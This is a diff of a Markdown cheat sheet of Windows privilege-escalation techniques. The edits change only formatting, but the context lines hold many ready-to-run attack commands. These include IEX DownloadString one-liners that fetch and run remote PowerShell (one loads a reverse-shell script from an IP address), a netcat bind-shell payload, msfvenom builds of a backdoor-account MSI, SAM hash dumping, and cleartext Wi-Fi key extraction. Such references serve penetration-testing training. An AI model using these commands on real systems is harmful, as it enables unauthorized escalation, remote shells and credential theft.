@@ -49,7 +49,7 @@
     * [Juicy Potato (Abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
     * [Rogue Potato (Fake OXID Resolver)](#rogue-potato-fake-oxid-resolver))
     * [EFSPotato (MS-EFSR EfsRpcOpenFileRaw)](#efspotato-ms-efsr-efsrpcopenfileraw))
-    * [PrintSpoofer (Printer Bug)](#PrintSpoofer-Printer-Bug)))
+    * [PrintSpoofer (Printer Bug)](#printspoofer-printer-bug)))
 * [EoP - Privileged File Write](#eop---privileged-file-write)
     * [DiagHub](#diaghub)
     * [UsoDLLLoader](#usodllloader)
@@ -69,37 +69,43 @@
 
 ## Tools
 
-- [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)
+* [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)
+
     ```powershell
     powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
     ```
-- [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
-- [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)
+* [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
+* [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)
+
     ```powershell
     powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
     ```
-- [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
-- [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
+* [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
+* [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
+
     ```powershell
     ./windows-exploit-suggester.py --update
     ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
     ```
-- [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
-- [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
-- [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
-- [Seatbelt - A C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)
+* [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
+* [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
+* [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
+* [Seatbelt - A C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)
+
     ```powershell
     Seatbelt.exe -group=all -full
     Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
     Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
     ```
-- [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
-- [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
+* [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
+* [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
+
     ```powershell
     powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
     ```
-- [winPEAS - Windows Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
-- [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)
+* [winPEAS - Windows Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
+* [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)
+
     ```powershell
     # First obtain systeminfo
     systeminfo
@@ -109,7 +115,8 @@
     python3 wes.py --update
     python3 wes.py systeminfo.txt
     ```
-- [PrivescCheck - Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)
+* [PrivescCheck - Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)
+
     ```powershell
     C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
     C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
@@ -123,6 +130,7 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 ```
 
 Extract patchs and updates
+
 ```powershell
 wmic qfe
 ```
@@ -259,7 +267,6 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 
 Enumerate antivirus on a box with `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
 
-
 ## Default Writable Folders
 
 ```powershell
@@ -308,7 +315,6 @@ samdump2 SYSTEM SAM -o sam.txt
 
 Either crack it with `john -format=NT /root/sam.txt`, [hashcat](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md#hashcat) or use Pass-The-Hash.
 
-
 ### HiveNightmare
 
 > CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user
@@ -347,7 +353,6 @@ Extract `HKLM\Software\Policies\Microsoft Services\AdmPwd` from Windows Registry
 * LAPS Password Length: PasswordLength
 * LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled
 
-
 ### Search for file contents
 
 ```powershell
@@ -358,7 +363,7 @@ findstr /spin "password" *.*
 
 Also search in remote places such as SMB Shares and SharePoint:
 
-* Search passwords in SharePoint: [nheiniger/SnaffPoint](https://github.com/nheiniger/SnaffPoint) (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6)
+* Search passwords in SharePoint: [nheiniger/SnaffPoint](https://github.com/nheiniger/SnaffPoint) (must be compiled first, for referencing issue see: [Pull #6](https://github.com/nheiniger/SnaffPoint/pull/6))
 
 ```powershell
 # First, retrieve a token
@@ -487,11 +492,13 @@ dir c:*ultravnc.ini /s /b
 ### Wifi passwords
 
 Find AP SSID
+
 ```bat
 netsh wlan show profile
 ```
 
 Get Cleartext Pass
+
 ```bat
 netsh wlan show profile <SSID> key=clear
 ```
@@ -510,14 +517,12 @@ The sticky notes app stores it's content in a sqlite db located at `C:\Users\<us
 
 Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
 
-
 ```powershell
 https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
-
 
 ### Passwords stored in Key Manager
 
@@ -556,6 +561,7 @@ PS > Get-Content -path flag.txt -Stream Flag
 ## EoP - Processes Enumeration and Tasks
 
 * What processes are running?
+
     ```powershell
     tasklist /v
     net start
@@ -566,22 +572,26 @@ PS > Get-Content -path flag.txt -Stream Flag
     ```
 
 * Which processes are running as "system"
+
     ```powershell
     tasklist /v /fi "username eq system"
     ```
 
 * Do you have powershell magic?
+
     ```powershell
     REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
     ```
 
 * List installed programs
+
     ```powershell
     Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
     Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
     ```
 
 * List services
+
     ```powershell
     net start
     wmic service list brief
@@ -589,6 +599,7 @@ PS > Get-Content -path flag.txt -Stream Flag
     ```
 
 * Enumerate scheduled tasks
+
     ```powershell
     schtasks /query /fo LIST 2>nul | findstr TaskName
     schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
@@ -596,6 +607,7 @@ PS > Get-Content -path flag.txt -Stream Flag
     ```
 
 * Startup tasks
+
     ```powershell
     wmic startup get caption,command
     reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
@@ -610,8 +622,9 @@ PS > Get-Content -path flag.txt -Stream Flag
 > A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.
 
 Often, services are pointing to writable locations:
-- Orphaned installs, not installed anymore but still exist in startup
-- DLL Hijacking
+* Orphaned installs, not installed anymore but still exist in startup
+* DLL Hijacking
+
     ```powershell
     # find missing DLL 
     - Find-PathDLLHijack PowerUp.ps1
@@ -632,7 +645,8 @@ Often, services are pointing to writable locations:
     }
     ```
 
-- PATH directories with weak permissions
+* PATH directories with weak permissions
+
     ```powershell
     $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
     $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
@@ -647,7 +661,7 @@ Often, services are pointing to writable locations:
 Alternatively you can use the Metasploit exploit : `exploit/windows/local/service_permissions`
 
 Note to check file permissions you can use `cacls` and `icacls`
-> icacls (Windows Vista +)    
+> icacls (Windows Vista +)
 > cacls (Windows XP)
 
 You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify access) or  `BUILTIN\Users:(W)`(Write-only access) in the output.
@@ -760,6 +774,7 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 
 * Metasploit exploit : `exploit/windows/local/trusted_service_path`
 * PowerUp exploit
+
     ```powershell
     # find the vulnerable application
     C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
@@ -779,17 +794,17 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 ### Example
 
 For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:
-- `C:\Program.exe`
-- `C:\Program Files.exe`
-
+* `C:\Program.exe`
+* `C:\Program Files.exe`
 
 ## EoP - $PATH Interception
 
 Requirements:
-- PATH contains a writable folder with low privileges.
-- The writable folder is _before_ the folder that contains the legitimate binary.
+* PATH contains a writable folder with low privileges.
+* The writable folder is _before_ the folder that contains the legitimate binary.
 
 EXAMPLE:
+
 ```powershell
 # List contents of the PATH environment variable
 # EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32
@@ -803,8 +818,7 @@ icacls.exe "C:\Program Files\nodejs\"
 copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"
 ```
 
-Because (in this example) "C:\Program Files\nodejs\" is _before_ "C:\WINDOWS\system32\" on the PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder. 
-
+Because (in this example) "C:\Program Files\nodejs\" is _before_ "C:\WINDOWS\system32\" on the PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder.
 
 ## EoP - Named Pipes
 
@@ -812,7 +826,6 @@ Because (in this example) "C:\Program Files\nodejs\" is _before_ "C:\WINDOWS\sys
 2. Check named pipes DACL: `pipesec.exe <named_pipe>`
 3. Reverse engineering software
 4. Send data throught the named pipe : `program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`
-
 
 ## EoP - Kernel Exploitation
 
@@ -838,7 +851,6 @@ List of exploits kernel : [https://github.com/SecWiki/windows-kernel-exploits](h
 | [MS16-014](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014) | KB3134228 | Remote Code Execution | 2008/Vista/7 |
 | [MS03-026](https://www.exploit-db.com/exploits/66) | KB823980 | Buffer Overrun In RPC Interface | NT/2000/XP/2003 |
 
-
 To cross compile a program from Kali, use the following command.
 
 ```powershell
@@ -852,11 +864,14 @@ Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
 Using the `reg query` command, you can check the status of the `AlwaysInstallElevated` registry key for both the user and the machine. If both queries return a value of `0x1`, then `AlwaysInstallElevated` is enabled for both user and machine, indicating the system is vulnerable.
 
 * Shell command
+
     ```powershell
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     ```
+
 * PowerShell command
+
     ```powershell
     Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
     Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
@@ -865,15 +880,15 @@ Using the `reg query` command, you can check the status of the `AlwaysInstallEle
 Then create an MSI package and install it.
 
 ```powershell
-$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
-$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
-$ msiexec /quiet /qn /i C:\evil.msi
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
+msiexec /quiet /qn /i C:\evil.msi
 ```
 
 Technique also available in :
+
 * Metasploit : `exploit/windows/local/always_install_elevated`
 * PowerUp.ps1 : `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`
-
 
 ### CustomActions
 
@@ -890,7 +905,7 @@ Get-WmiObject Win32_Product | Select Name, LocalPackage
 wmic product get identifyingnumber,name,vendor,version,localpackage
 ```
 
-Execute the repair process with the `/fa` parameter to trigger the CustomActions. 
+Execute the repair process with the `/fa` parameter to trigger the CustomActions.
 We can use both IdentifyingNumber `{E0F1535A-8414-5EF1-A1DD-E17EDCDC63F1}` or path to the installer `c:\windows\installer\XXXXXXX.msi`.
 The repair will run with the NT SYSTEM account.
 
@@ -909,11 +924,11 @@ Common mistakes in MSI installers:
 * Binaries/Scripts loaded from user writable paths: you might need to win the race condition.
 * DLL hijacking/search order abusing
 * PowerShell `-NoProfile` missing: Add custom commands into your profile
+
     ```ps1
     new-item -Path $PROFILE -Type file -Force
     echo "Start-Process -FilePath cmd.exe -Wait;" > $PROFILE
     ```
-
 
 ## EoP - Insecure GUI apps
 
@@ -921,13 +936,13 @@ Application running as SYSTEM allowing an user to spawn a CMD, or browse directo
 
 Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"
 
-
 ## EoP - Evaluating Vulnerable Drivers
 
 Look for vuln drivers loaded, we often don't spend enough time looking at this:
 
 * [Living Off The Land Drivers](https://www.loldrivers.io/) is a curated list of Windows drivers used by adversaries to bypass security controls and carry out attacks. The project helps security professionals stay informed and mitigate potential threats.
 * Native binary: DriverQuery.exe
+
     ```powershell
     PS C:\Users\Swissky> driverquery.exe /fo table /si
     Module Name  Display Name           Driver Type   Link Date
@@ -943,7 +958,9 @@ Look for vuln drivers loaded, we often don't spend enough time looking at this:
     ADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM
     <SNIP>
     ```
+
 * [matterpreter/OffensiveCSharp/DriverQuery](https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery)
+
     ```powershell
     PS C:\Users\Swissky> DriverQuery.exe --no-msft
     [+] Enumerating driver services...
@@ -1028,7 +1045,7 @@ PS C:\target> Add-Printer -ConnectionName $fullprinterName
 
 ### Bring Your Own Vulnerability
 
-Concealed Position : https://github.com/jacob-baines/concealed_position
+[jacob-baines/concealed_position](https://github.com/jacob-baines/concealed_position)
 
 * ACIDDAMAGE - [CVE-2021-35449](https://nvd.nist.gov/vuln/detail/CVE-2021-35449) - Lexmark Universal Print Driver LPE
 * RADIANTDAMAGE - [CVE-2021-38085](https://nvd.nist.gov/vuln/detail/CVE-2021-38085) - Canon TR150 Print Driver LPE
@@ -1055,8 +1072,9 @@ Currently stored credentials:
  User: WORKGROUP\Administrator
 ```
 
-Then you can use `runas` with the `/savecred` options in order to use the saved credentials. 
+Then you can use `runas` with the `/savecred` options in order to use the saved credentials.
 The following example is calling a remote binary via an SMB share.
+
 ```powershell
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 runas /savecred /user:Administrator "cmd.exe /k whoami"
@@ -1098,7 +1116,7 @@ PsExec.exe -i -s cmd.exe
 
 ## EoP - Living Off The Land Binaries and Scripts
 
-Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/
+Living Off The Land Binaries and Scripts (and also Libraries) : [lolbas-project.github.io](https://lolbas-project.github.io)
 
 > The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.
 
@@ -1117,20 +1135,19 @@ Microsoft.Workflow.Compiler.exe tests.xml results.xml
 
 ## EoP - Impersonation Privileges
 
-Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.
+Full privileges cheatsheet at [gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.
 
 | Privilege | Impact | Tool | Execution path | Remarks |
 | --- | --- | --- | --- | --- |
-|`SeAssignPrimaryToken`| ***Admin*** | 3rd party tool | *"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"* | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon. |
-|`SeBackup`| **Threat** | ***Built-in commands*** | Read sensitve files with `robocopy /b` |- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br> <br>- `SeBackupPrivilege` (and robocopy) is not helpful when it comes to open files.<br> <br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter. |
-|`SeCreateToken`| ***Admin*** | 3rd party tool | Create arbitrary token including local admin rights with `NtCreateToken`. ||
-|`SeDebug`| ***Admin*** | **PowerShell** | Duplicate the `lsass.exe` token.  | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) |
-|`SeLoadDriver`| ***Admin*** | 3rd party tool | 1. Load buggy kernel driver such as `szkg64.sys` or `capcom.sys`<br>2. Exploit the driver vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers with `ftlMC` builtin command. i.e.: `fltMC sysmondrv` | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh)  |
-|`SeRestore`| ***Admin*** | **PowerShell** | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
-|`SeTakeOwnership`| ***Admin*** | ***Built-in commands*** |1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
-|`SeTcb`| ***Admin*** | 3rd party tool | Manipulate tokens to have local admin rights included. May require SeImpersonate.<br> <br>To be verified. ||
-|`SeRelabel`| ***Admin*** | 3rd party too | [decoder-it/RelabelAbuse](https://github.com/decoder-it/RelabelAbuse) | Allows you to own resources that have an integrity level even higher than your own |
-
+|`SeAssignPrimaryToken`| _**Admin**_ | 3rd party tool | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_ | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon. |
+|`SeBackup`| **Threat** | _**Built-in commands**_ | Read sensitve files with `robocopy /b` |- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br> <br>- `SeBackupPrivilege` (and robocopy) is not helpful when it comes to open files.<br> <br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter. |
+|`SeCreateToken`| _**Admin**_ | 3rd party tool | Create arbitrary token including local admin rights with `NtCreateToken`. ||
+|`SeDebug`| _**Admin**_ | **PowerShell** | Duplicate the `lsass.exe` token.  | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) |
+|`SeLoadDriver`| _**Admin**_ | 3rd party tool | 1. Load buggy kernel driver such as `szkg64.sys` or `capcom.sys`<br>2. Exploit the driver vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers with `ftlMC` builtin command. i.e.: `fltMC sysmondrv` | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh)  |
+|`SeRestore`| _**Admin**_ | **PowerShell** | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
+|`SeTakeOwnership`| _**Admin**_ | _**Built-in commands**_ |1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
+|`SeTcb`| _**Admin**_ | 3rd party tool | Manipulate tokens to have local admin rights included. May require SeImpersonate.<br> <br>To be verified. ||
+|`SeRelabel`| _**Admin**_ | 3rd party too | [decoder-it/RelabelAbuse](https://github.com/decoder-it/RelabelAbuse) | Allows you to own resources that have an integrity level even higher than your own |
 
 ### Restore A Service Account's Privileges
 
@@ -1177,6 +1194,7 @@ python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
 
 * Binary available at : [foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato) and [breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)
 * Exploit using Metasploit with `incognito mode` loaded.
+
     ```c
     getuid
     getprivs
@@ -1193,13 +1211,12 @@ Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
 ```
 
-
 ### Juicy Potato (Abusing the golden privileges)
 
-> If the machine is **>= Windows 10 1809 & Windows Server 2019** - Try **Rogue Potato**    
+> If the machine is **>= Windows 10 1809 & Windows Server 2019** - Try **Rogue Potato**
 > If the machine is **< Windows 10 1809 < Windows Server 2019** - Try **Juicy Potato**
 
-* Binary available at : [ohpe/juicy-potato](https://github.com/ohpe/juicy-potato/releases) 
+* Binary available at : [ohpe/juicy-potato](https://github.com/ohpe/juicy-potato/releases)
 
 1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
 
@@ -1209,13 +1226,13 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 
 2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object
 
-    * [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise) 
+    * [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise)
     * [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
     * [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
     * [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
-    * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise) 
+    * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise)
     * [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
-    * [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard) 
+    * [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard)
 
 3. Execute JuicyPotato to run a privileged command.
 
@@ -1251,7 +1268,7 @@ RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8
 
 ### EFSPotato (MS-EFSR EfsRpcOpenFileRaw)
 
-* Binary available at https://github.com/zcgonvh/EfsPotato
+* Binary available at [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
 
 ```powershell
 # .NET 4.x
@@ -1271,12 +1288,11 @@ C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe /platform:x86 EfsPotato.cs
 JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
 ```
 
-
-###  PrintSpoofer (Printer Bug)
+### PrintSpoofer (Printer Bug)
 
 > this work if SeImpersonatePrivilege is enabled
 
-* Binary available at https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
+* Binary available at [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
 
 ```powershell
 # run nc -lnvp 443 then :
@@ -1293,21 +1309,21 @@ JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juic
 
 :warning: Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs.
 
-The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM. 
-This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the `C:\Windows\System32` directory. 
+The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM.
+This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the `C:\Windows\System32` directory.
 
 #### Exploit
 
 1. Create an [evil DLL](https://gist.github.com/xct/3949f3f4f178b1f3427fae7686a2a9c0) e.g: payload.dll and move it into `C:\Windows\System32`
-2. Build https://github.com/xct/diaghub
+2. Build [xct/diaghub](https://github.com/xct/diaghub)
 3. `diaghub.exe c:\\ProgramData\\ payload.dll`
 
 The default payload will run `C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe`
 
 Alternative tools:
-* https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag
-* https://github.com/decoder-it/diaghub_exploit
 
+* [Accenture/AARO-Bugs/CVE-2020-5825/TrigDiag](https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag)
+* [decoder-it/diaghub_exploit](https://github.com/decoder-it/diaghub_exploit)
 
 ### UsoDLLLoader
 
@@ -1319,7 +1335,7 @@ If we found a privileged file write vulnerability in Windows or in some third-pa
 
 #### Exploit
 
-1. Build https://github.com/itm4n/UsoDllLoader
+1. Build [itm4n/UsoDllLoader](https://github.com/itm4n/UsoDllLoader)
     * Select Release config and x64 architecure.
     * Build solution.
         * DLL .\x64\Release\WindowsCoreDeviceInfo.dll
@@ -1327,12 +1343,11 @@ If we found a privileged file write vulnerability in Windows or in some third-pa
 2. Copy `WindowsCoreDeviceInfo.dll` to `C:\Windows\System32\`
 3. Use the loader and wait for the shell or run `usoclient StartInteractiveScan` and connect to the bind shell on port 1337.
 
-
 ### WerTrigger
 
 > Exploit Privileged File Writes bugs with Windows Problem Reporting
 
-1. Clone https://github.com/sailay1996/WerTrigger
+1. Clone [sailay1996/WerTrigger](https://github.com/sailay1996/WerTrigger)
 2. Copy `phoneinfo.dll` to `C:\Windows\System32\`
 3. Place `Report.wer` file and `WerTrigger.exe` in a same directory.
 4. Then, run `WerTrigger.exe`.
@@ -1342,22 +1357,22 @@ If we found a privileged file write vulnerability in Windows or in some third-pa
 
 > Exploit Privileged Directory Creation Bugs with Windows Error Reporting
 
-1. Clone https://github.com/binderlabs/DirCreate2System
+1. Clone [binderlabs/DirCreate2System](https://github.com/binderlabs/DirCreate2System)
 2. Create directory `C:\Windows\System32\wermgr.exe.local\`
 3. Grant access to it: `cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f`
